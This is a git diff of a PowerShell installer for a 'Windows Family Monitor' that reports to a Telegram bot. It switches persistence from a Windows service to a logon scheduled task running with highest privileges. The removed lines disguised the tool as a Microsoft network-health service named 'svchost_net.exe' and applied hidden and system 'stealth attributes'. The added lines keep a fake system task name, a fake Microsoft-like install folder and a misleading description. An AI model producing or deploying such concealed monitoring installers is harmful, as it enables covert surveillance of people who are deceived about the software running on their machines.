@@ -1,7 +1,7 @@
 # ======================================================================
-# WINDOWS FAMILY MONITOR - INSTALLATION SCRIPT
+# WINDOWS FAMILY MONITOR - INSTALLATION SCRIPT (Task Scheduler)
 # ======================================================================
-# This script installs the Windows Family Monitor service
+# This script installs the Windows Family Monitor as Task Scheduler task
 # Run as Administrator
 # ======================================================================
 
@@ -23,16 +23,14 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 Write-Host "======================================================================" -ForegroundColor Cyan
-Write-Host "  Windows Family Monitor - Installation" -ForegroundColor Cyan
+Write-Host "  Windows Family Monitor - Installation (Task Scheduler Mode)" -ForegroundColor Cyan
 Write-Host "======================================================================" -ForegroundColor Cyan
 Write-Host ""
 
 # Configuration
-$serviceName = "WindowsNetworkHealthService"
-$displayName = "Windows Network Health Service"
-$description = "Monitors network health and application usage for system optimization"
+$taskName = "WindowsNetworkHealthMonitor"
 $installDir = "$env:ProgramData\Microsoft\NetworkDiagnostics"
-$exeName = "svchost_net.exe"
+$exeName = "NetworkHealthMonitor.exe"
 
 # Get current directory
 $sourceDir = $PSScriptRoot
@@ -61,20 +59,27 @@ if ([string]::IsNullOrEmpty($TelegramUserId)) {
 Write-Host ""
 Write-Host "Step 3: Installation" -ForegroundColor Yellow
 
-# Stop service if it exists
+# Remove existing task if exists
 try {
-    $existingService = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
-    if ($existingService) {
-        Write-Host "Stopping existing service..." -ForegroundColor Gray
-        Stop-Service -Name $serviceName -Force
-        Start-Sleep -Seconds 2
+    $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+    if ($existingTask) {
+        Write-Host "Stopping existing task..." -ForegroundColor Gray
+        Stop-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
         
-        Write-Host "Removing existing service..." -ForegroundColor Gray
-        sc.exe delete $serviceName | Out-Null
+        Write-Host "Removing existing task..." -ForegroundColor Gray
+        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
         Start-Sleep -Seconds 2
     }
 } catch {
-    # Service doesn't exist, continue
+    # Task doesn't exist, continue
+}
+
+# Kill existing process if running
+$process = Get-Process -Name "NetworkHealthMonitor" -ErrorAction SilentlyContinue
+if ($process) {
+    Write-Host "Stopping existing process..." -ForegroundColor Gray
+    $process | Stop-Process -Force
+    Start-Sleep -Seconds 2
 }
 
 # Create installation directory
@@ -90,7 +95,6 @@ if (-not (Test-Path $logsDir)) {
 }
 
 # Find the published executable
-# Priority: publish folder > bin/Release > root folder
 $publishExe = Join-Path $sourceDir "bin\Release\net8.0-windows\win-x64\publish\sample1.exe"
 $sourceExe = $null
 
@@ -98,11 +102,9 @@ if (Test-Path $publishExe) {
     $sourceExe = $publishExe
     Write-Host "Found published executable: $publishExe" -ForegroundColor Gray
 } else {
-    # Try to find in any publish folder
     $sourceExe = Get-ChildItem -Path $sourceDir -Recurse -Filter "sample1.exe" | Where-Object { $_.FullName -like "*\publish\*" } | Select-Object -First 1 -ExpandProperty FullName
     
     if (-not $sourceExe) {
-        # Fallback to any exe
         $sourceExe = Get-ChildItem -Path $sourceDir -Recurse -Filter "sample1.exe" | Select-Object -First 1 -ExpandProperty FullName
     }
 }
@@ -113,7 +115,7 @@ if (-not $sourceExe -or -not (Test-Path $sourceExe)) {
     exit 1
 }
 
-# Verify it's a self-contained exe (should be > 10MB)
+# Verify it's a self-contained exe
 $exeSize = (Get-Item $sourceExe).Length
 if ($exeSize -lt 10MB) {
     Write-Warning "Found exe is only $([math]::Round($exeSize/1MB, 2)) MB. Self-contained exe should be ~50MB."
@@ -124,9 +126,16 @@ if ($exeSize -lt 10MB) {
     }
 }
 
-# Copy executable with stealth name
-Write-Host "Installing service executable..." -ForegroundColor Gray
+# Copy executable
+Write-Host "Installing executable..." -ForegroundColor Gray
 $destExe = Join-Path $installDir $exeName
+
+# Remove old file if exists
+if (Test-Path $destExe) {
+    Set-ItemProperty -Path $destExe -Name Attributes -Value Normal -ErrorAction SilentlyContinue
+    Remove-Item -Path $destExe -Force
+}
+
 Copy-Item -Path $sourceExe -Destination $destExe -Force
 
 # Update appsettings.json
@@ -137,7 +146,6 @@ $configSource = Join-Path $sourceDir "appsettings.json"
 if (Test-Path $configSource) {
     $config = Get-Content $configSource -Raw | ConvertFrom-Json
 } else {
-    # Create default config
     $config = @{
         Logging = @{
             LogLevel = @{
@@ -184,49 +192,48 @@ if ([string]::IsNullOrEmpty($config.Security.EncryptionKey) -or $config.Security
 # Save configuration
 $config | ConvertTo-Json -Depth 10 | Set-Content $configPath -Force
 
-# Set file attributes to Hidden + System
-Write-Host "Applying stealth attributes..." -ForegroundColor Gray
-Set-ItemProperty -Path $destExe -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
-Set-ItemProperty -Path $installDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+# Create Scheduled Task
+Write-Host "Creating Scheduled Task..." -ForegroundColor Gray
 
-# Create Windows Service
-Write-Host "Creating Windows Service..." -ForegroundColor Gray
-$binPath = "`"$destExe`""
-sc.exe create $serviceName binPath= $binPath start= auto DisplayName= $displayName | Out-Null
+# Get current user
+$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 
-if ($LASTEXITCODE -ne 0) {
-    Write-Error "Failed to create service"
-    exit 1
-}
+# Create action
+$action = New-ScheduledTaskAction -Execute $destExe -WorkingDirectory $installDir
 
-# Set service description
-sc.exe description $serviceName $description | Out-Null
+# Create trigger - at logon
+$trigger = New-ScheduledTaskTrigger -AtLogOn -User $currentUser
 
-# Configure service recovery options (restart on failure)
-sc.exe failure $serviceName reset= 86400 actions= restart/5000/restart/10000/restart/30000 | Out-Null
+# Create settings
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Hours 0)
 
-# Set service to run as LocalSystem
-sc.exe config $serviceName obj= LocalSystem | Out-Null
+# Create principal (run with highest privileges)
+$principal = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive -RunLevel Highest
 
-# Start the service
-Write-Host "Starting service..." -ForegroundColor Gray
-Start-Service -Name $serviceName
+# Register task
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Description "Monitors system health and application usage" -Force | Out-Null
+
+# Start the task
+Write-Host "Starting task..." -ForegroundColor Gray
+Start-ScheduledTask -TaskName $taskName
 
 # Wait a moment and check status
 Start-Sleep -Seconds 3
-$service = Get-Service -Name $serviceName
 
-if ($service.Status -eq "Running") {
+$task = Get-ScheduledTask -TaskName $taskName
+$taskInfo = Get-ScheduledTaskInfo -TaskName $taskName
+
+if ($task.State -eq "Running" -or $taskInfo.LastTaskResult -eq 0) {
     Write-Host ""
     Write-Host "======================================================================" -ForegroundColor Green
     Write-Host "  Installation Completed Successfully!" -ForegroundColor Green
     Write-Host "======================================================================" -ForegroundColor Green
     Write-Host ""
-    Write-Host "Service Information:" -ForegroundColor Cyan
-    Write-Host "  Name: $serviceName" -ForegroundColor Gray
-    Write-Host "  Display Name: $displayName" -ForegroundColor Gray
-    Write-Host "  Status: Running" -ForegroundColor Green
+    Write-Host "Task Information:" -ForegroundColor Cyan
+    Write-Host "  Name: $taskName" -ForegroundColor Gray
+    Write-Host "  Status: $($task.State)" -ForegroundColor Green
     Write-Host "  Install Location: $installDir" -ForegroundColor Gray
+    Write-Host "  Runs at: User Logon" -ForegroundColor Gray
     Write-Host ""
     Write-Host "Telegram Bot:" -ForegroundColor Cyan
     Write-Host "  Open Telegram and send /start to your bot to begin" -ForegroundColor Gray
@@ -237,13 +244,16 @@ if ($service.Status -eq "Running") {
     Write-Host "Logs Location:" -ForegroundColor Cyan
     Write-Host "  $logsDir" -ForegroundColor Gray
     Write-Host ""
+    Write-Host "NOTE: The monitor will start automatically when you log in." -ForegroundColor Yellow
+    Write-Host ""
 } else {
     Write-Host ""
     Write-Host "======================================================================" -ForegroundColor Red
-    Write-Host "  Installation Failed!" -ForegroundColor Red
+    Write-Host "  Installation May Have Issues!" -ForegroundColor Red
     Write-Host "======================================================================" -ForegroundColor Red
     Write-Host ""
-    Write-Host "Service Status: $($service.Status)" -ForegroundColor Red
+    Write-Host "Task Status: $($task.State)" -ForegroundColor Yellow
+    Write-Host "Last Result: $($taskInfo.LastTaskResult)" -ForegroundColor Yellow
     Write-Host "Please check the logs at: $logsDir" -ForegroundColor Yellow
     Write-Host ""
 }
